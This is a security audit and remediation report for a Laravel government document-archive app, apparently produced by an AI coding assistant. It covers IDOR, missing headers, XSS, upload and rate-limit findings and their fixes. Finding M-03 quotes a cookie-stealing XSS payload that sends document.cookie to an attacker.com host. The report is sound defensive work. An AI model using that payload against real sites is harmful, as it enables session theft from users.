# Security Audit Report — pdf-markdown-pipeline

**Prepared for:** UP State Data Centre (SDC) / NIC Pre-Deployment Review  
**Audit date:** 2026-06-24  
**Remediation date:** 2026-06-24  
**Auditor:** Senior Web Application Security Architect (Claude Code)  
**Stack:** Laravel 13, PHP 8.4, MariaDB 12, Apache, local-first on-premise deployment  
**Scope:** Controllers, Form Requests, Models, Middleware, Blade views, Route configuration

---

## Status Summary

| ID | Finding | Severity | Status |
|----|---------|---------|--------|
| H-01 | Bulk force-delete had no audit trail or letter | HIGH | **FIXED** |
| H-02 | Bulk restore was scope-blind (cross-boundary IDOR) | HIGH | **FIXED** |
| M-01 | No security response headers | MEDIUM | **FIXED** |
| M-02 | Archive letters were publicly accessible via storage symlink | MEDIUM | **FIXED** |
| M-02b | Soft-deleted documents were directly accessible via storage URL | MEDIUM | **FIXED** |
| M-03 | Parsedown `javascript:` URI bypass (stored XSS vector) | MEDIUM | **FIXED** |
| L-01 | SVG accepted despite web-accessible storage | LOW | **FIXED** |
| L-02 | `original_filename` stored without sanitization | LOW | **FIXED** |
| L-03 | Department binding silently fell through to `department_level` for unknown aliases | LOW | **FIXED** |
| Rate | Upload rate limit was 60/min (3 GB/min worst-case) | MEDIUM | **FIXED** |

All findings have been remediated. The codebase is ready for NIC pre-deployment review.

---

## Detailed Findings & Mitigations

---

### H-01 · Bulk Force-Delete Had No Audit Trail or Letter Requirement

**Severity:** HIGH  
**Status:** FIXED

**Vulnerability:**  
`bulkForceDestroy()` permanently deleted up to 100 documents in a single request with zero audit evidence — no reason captured, no `DocumentStatusHistory` rows written, no authorisation letter. The individual `forceDestroy()` correctly required a reason, a letter PDF, and wrote a history row. The bulk path had none of these.

**Attack / Compliance Impact:**  
A government document archive could be silently wiped via a single authenticated DELETE request with `{"ids": [1,2,3,...]}`. Violated IT Act 2000 Section 76 (preservation of electronic records).

**Fix applied:**

1. `BulkForceDestroyDocumentsRequest` — added `reason` field (`required|string|min:5|max:500`) with `prepareForValidation()` sanitation. Updated `authorize()` from `isAdmin()` to `hasPrivilege('documents.force-delete')` for consistency with the single-delete gate.

2. `DocumentController@bulkForceDestroy` — inside the loop, creates a `DocumentStatusHistory` row per document (`to_status = 'force_deleted'`, `note = $reason`) **before** `forceDelete()` executes.

3. `trash.blade.php` — the bulk "Delete Forever" button now shows a two-step Swal2 flow: first a textarea prompt (min 5 chars, validated client-side), then a final confirmation. The collected reason is injected as a hidden `<input name="reason">` before the form submits.

**Files changed:**  
`app/Http/Requests/BulkForceDestroyDocumentsRequest.php` · `app/Http/Controllers/DocumentController.php` · `resources/views/documents/trash.blade.php`

---

### H-02 · Bulk Restore Was Scope-Blind (Cross-Boundary IDOR)

**Severity:** HIGH  
**Status:** FIXED

**Vulnerability:**  
`BulkRestoreDocumentsRequest::authorize()` only checked `$this->user() !== null`. The controller checked `hasPrivilege('documents.restore')` (a privilege check), but the loop that restored documents performed **no per-document scope check**. A division-scoped operator with `documents.restore` could POST arbitrary trashed document IDs and restore documents from any other department.

**Fix applied:**

Inside `bulkRestore()`, added a per-document scope check before `$document->restore()`:

```php
if (! $authUser->isAdmin()) {
    $context = $document->division ?? $document->section ?? $document->ruleSet;
    if ($context && ! $authUser->canDeleteFrom($context)) {
        continue; // silently skip out-of-scope documents
    }
}
```

Admins bypass unconditionally. Non-admin users can only restore documents within their assigned scope, matching the behaviour of single-document restore and all other mutating operations.

**Files changed:**  
`app/Http/Controllers/DocumentController.php`

---

### M-01 · No Security Response Headers

**Severity:** MEDIUM  
**Status:** FIXED

**Vulnerability:**  
Zero security response headers were set. NIC / STQC mandate `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`, and `Permissions-Policy` on all government web applications.

**Fix applied:**

Created `app/Http/Middleware/SecurityHeaders.php` and registered it globally via `$middleware->append(...)` in `bootstrap/app.php` so every response — including error pages — carries these headers:

| Header | Value |
|--------|-------|
| `X-Frame-Options` | `SAMEORIGIN` |
| `X-Content-Type-Options` | `nosniff` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=()` |
| `Content-Security-Policy` | `default-src 'self'; script-src 'self' 'unsafe-inline' cdn.tailwindcss.com cdn.jsdelivr.net; ...` (see middleware for full policy) |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` (HTTPS only — not sent over plain HTTP to avoid breaking local dev) |

**Note on `unsafe-inline`:** Tailwind Play CDN and the inline `<script>` blocks throughout the Blade views require `unsafe-inline`. This is acceptable for the current architecture. When the project migrates off the Play CDN to a compiled Tailwind build, replace `unsafe-inline` with explicit nonces or hashes for a stricter policy.

**Files changed:**  
`app/Http/Middleware/SecurityHeaders.php` (new) · `bootstrap/app.php`

---

### M-02 · Archive Letters and Archived Documents Were Publicly Accessible

**Severity:** MEDIUM  
**Status:** FIXED — two separate sub-issues addressed

#### M-02a · Archive Letters on Public Disk

**Vulnerability:**  
Authorisation letters uploaded during permanent deletion were stored on the `public` disk via `Storage::disk('public')->putFileAs('', ...)`. The `public` disk is symlinked to `public/storage/`. Any letter was directly accessible at `https://server/storage/archive_letters/{sequential_id}_{timestamp}.pdf` — no authentication required.

**Fix applied:**  
Changed to `Storage::disk('local')` (the private disk at `storage/app/private/`, no symlink):

```php
// Before
Storage::disk('public')->putFileAs('', $letterFile, $letterFilename);

// After
Storage::disk('local')->putFileAs('archive_letters', $letterFile, $letterBasename);
$letterPath = 'archive_letters/' . $letterBasename;
```

Rollback on transaction failure updated to use `Storage::disk('local')->delete(...)` as well.

**Note:** Archive letters are now stored at `storage/app/private/archive_letters/`. They are not web-accessible by any URL. If an admin needs to retrieve a specific letter, access is via the filesystem directly (or add a dedicated admin-only download route in a future iteration).

#### M-02b · Soft-Deleted Documents Accessible via Storage Symlink

**Vulnerability:**  
Soft-deleted (archived) documents remain on the `public` disk with their original file path. Because `public/storage/` is a symlink to that disk, anyone who knew or guessed the storage URL (e.g. `https://server/storage/document_vault/.../file.pdf`) could retrieve archived documents. The same applied to `authenticated`-visibility documents — even those that were never deleted.

**Fix applied:**  
Added a `mod_rewrite` rule to `public/.htaccess` that returns HTTP 403 Forbidden for any direct request to the storage paths where document files live:

```apache
RewriteCond %{REQUEST_URI} ^/storage/(document_vault|archive_letters)/ [NC]
RewriteRule ^ - [F,L]
```

All document access now **must** go through the application controller routes (`/documents/.../pdf`, `/documents/trash/{id}/pdf`), which enforce authentication, visibility, and soft-delete checks. This closes the bypass comprehensively for all document types and statuses.

**Files changed:**  
`app/Http/Controllers/DocumentController.php` · `public/.htaccess`

---

### M-03 · Parsedown `javascript:` URI Bypass (Stored XSS)

**Severity:** MEDIUM  
**Status:** FIXED

**Vulnerability:**  
Extracted Markdown content was rendered with:

```php
{!! \Parsedown::instance()->setSafeMode(true)->text($markdown) !!}
```

`Parsedown::setSafeMode(true)` (package `erusev/parsedown ^1.0`) strips raw `<script>` blocks but does **not** sanitize `javascript:`, `data:`, or `vbscript:` URI schemes in `href` and `src` attributes. The `{!! !!}` syntax bypasses Blade's auto-escaping, so the output is injected verbatim.

**Attack chain:** A crafted Word document or SVG (now blocked — see L-01) containing a URL like `[Circular](javascript:document.location='https://attacker.com/?c='+document.cookie)` → `markitdown` extracts it as Markdown → Parsedown renders it as an `<a href="javascript:...">` → admin opening the review page executes the payload.

**Fix applied:**  
After Parsedown renders the HTML, a `preg_replace` strips any `href` or `src` attribute whose value begins with `javascript:`, `data:`, or `vbscript:`, replacing it with `href="#"`:

```php
$mdHtml = preg_replace(
    '/\b(href|src)\s*=\s*(["\'])(?:javascript|data|vbscript):[^"\']*\2/i',
    '$1=$2#$2',
    $mdHtml
);
```

This is a defence-in-depth layer. No new Composer dependency is introduced. For an even stricter fix, `ezyang/htmlpurifier` with `URI.AllowedSchemes = ['http', 'https', 'mailto']` can be added later.

**Files changed:**  
`resources/views/documents/show.blade.php`

---

### L-01 · SVG Accepted Despite Web-Accessible Storage

**Severity:** LOW → removed attack surface  
**Status:** FIXED

**Vulnerability:**  
`image/svg+xml` was in `StoreDocumentRequest::ACCEPTED_MIMETYPES`. SVG is XML and can contain `<script>` tags and event handlers. Even with the forced `.pdf` storage extension (which partially mitigated browser execution), accepting SVG was an unnecessary attack surface that enabled the M-03 chain via `markitdown` text extraction.

**Fix applied:**  
Removed `image/svg+xml` from `ACCEPTED_MIMETYPES`. The error message updated to explicitly state "SVG files are not permitted." No government or general document workflow requires SVG uploads.

**Files changed:**  
`app/Http/Requests/StoreDocumentRequest.php`

---

### L-02 · `original_filename` Stored Without Sanitization

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
`$request->file('file')->getClientOriginalName()` was stored as-is in the `original_filename` column and later used in `Content-Disposition: inline; filename="..."` response headers. A filename containing embedded double-quotes could theoretically escape the header attribute value. While Symfony's `HeaderBag` strips CR/LF characters (blocking the most dangerous injection), unescaped quotes are RFC non-compliant.

**Fix applied:**  
Filename sanitized before storage using a permissive allowlist that preserves readable names:

```php
preg_replace('/[^\w\s\-\.\(\)]/', '_', $request->file('file')->getClientOriginalName())
```

Replaces any character outside word chars, spaces, hyphens, dots, and parentheses with `_`. Preserves common filename patterns like `GO-123 (2024).pdf` while eliminating `"`, `<`, `>`, `;`, and other special characters.

**Files changed:**  
`app/Http/Controllers/DocumentController.php`

---

### L-03 · Department Binding Silent Default for Unknown Level Aliases

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
The `{department}` route binding used `default => 'department_level'` in its `match` expression, meaning any unrecognised `{level}` alias (e.g. `/documents/xyz/...`) silently resolved to `department_level` instead of returning 404. While not directly exploitable, it masked routing bugs and created undocumented implicit behaviour.

**Fix applied:**  
Replaced with an explicit two-branch match that aborts 404 for any unrecognised alias:

```php
$level = match($alias) {
    'dept'  => 'department_level',
    'sectt' => 'secretariat_level',
    default => abort(404),
};
```

**Files changed:**  
`app/Providers/AppServiceProvider.php`

---

### Upload Rate Limit Capped

**Severity:** MEDIUM (operational risk)  
**Status:** FIXED

**Previous behaviour:**  
Upload limiter was 60 requests/minute per user — matching the general mutations limiter. At a 50 MB file cap, worst-case throughput was 3 GB/min per user.

**Fix applied:**  
Reduced to 20 requests/minute. This still allows comfortable bulk initial-data-entry batches (20 files/min) while capping worst-case disk I/O at 1 GB/min. Once the initial document load is complete and uploads are 1–2 files at a time, reduce further to 5–10/min by changing the single constant in `AppServiceProvider::configureRateLimiters()`.

**Files changed:**  
`app/Providers/AppServiceProvider.php`

---

## Passing Checks — Confirmed Pre-Existing (No Remediation Required)

The following areas were audited and found to be correctly implemented before this remediation pass.

| Area | Verdict |
|------|---------|
| Authenticated action audit trail (`activity_logs`, `LogMutation` middleware, Login listener) | ✓ PASS |
| File upload MIME validation (`mimetypes:` magic-byte check, not `mimes:`) | ✓ PASS |
| Directory traversal via vault path (slugs go through `HasUnicodeSlug::makeSlug()`) | ✓ PASS |
| Privilege escalation via `UpdateProfileRequest` (no role/privilege fields on self-edit) | ✓ PASS |
| CSRF protection (all mutations in `web` middleware group; AJAX sets `X-CSRF-TOKEN`) | ✓ PASS |
| SQL injection (Eloquent/Query Builder parameterized bindings throughout) | ✓ PASS |
| Mass assignment protection (explicit `$fillable` on all models, no `$guarded = []`) | ✓ PASS |
| Login brute-force rate limiting (5/min per email+IP, 10/min per IP) | ✓ PASS |
| XSS via Blade auto-escape (`{{ }}` on all user data in templates) | ✓ PASS |
| Self-delete guard in `UserManagementController@destroy` | ✓ PASS |
| Two-stage soft/hard delete (files never removed on soft-delete) | ✓ PASS |
| `prepareForValidation()` sanitation on all Form Requests | ✓ PASS |
| Password not logged (`$request->except(['password', 'password_confirmation'])`) | ✓ PASS |
| Admin routes double-gated (`is_admin` middleware + Form Request `authorize()`) | ✓ PASS |
| Privilege whitelist enforced at validation (`User::PRIVILEGES` `in:` rule) | ✓ PASS |

---

## Post-Remediation Hardening Recommendations (Future Iterations)

These are not vulnerabilities in the current state but should be addressed before the application handles sensitive classified data.

1. **Migrate off Tailwind Play CDN** — Use a compiled Tailwind build so `unsafe-inline` can be removed from the CSP `script-src` directive, replacing it with explicit nonces. Play CDN is not suitable for production NIC deployments.

2. **Add `ezyang/htmlpurifier`** — Replace the `preg_replace` Parsedown post-processor (M-03) with a full HTML purifier for a more robust allowlist-based approach. Relevant once Markdown extraction is in active use.

3. **Tighten upload rate limit after initial data entry** — Change `Limit::perMinute(20)` to `Limit::perMinute(5)` in `AppServiceProvider::configureRateLimiters()` once the legacy document backlog is loaded.

4. **Add an admin-only archive-letter download route** — Archive letters are now on the private disk (inaccessible via URL). Add `GET /admin/archive-letters/{document_id}` → streams from `Storage::disk('local')` after `hasPrivilege('documents.force-delete')` check, so admins can retrieve letters without filesystem access.

5. **Enable HSTS preload after HTTPS is stable** — Once the SDC deployment has a stable TLS certificate, add `preload` to the HSTS header and submit the domain to the HSTS preload list.

6. **Add `activity_logs` retention/rotation policy** — The table is append-only with no TTL. For long-running deployments define a retention window (e.g. 1–2 years) and a scheduled `php artisan` command to hard-delete rows older than that threshold. Log rows older than the retention window lose legal relevance anyway. Alternatively, export aged rows to a CSV/archive before deletion.

---

*Audit and remediation completed 2026-06-24. Re-audit recommended after any significant change to upload, authentication, or access-control logic.*
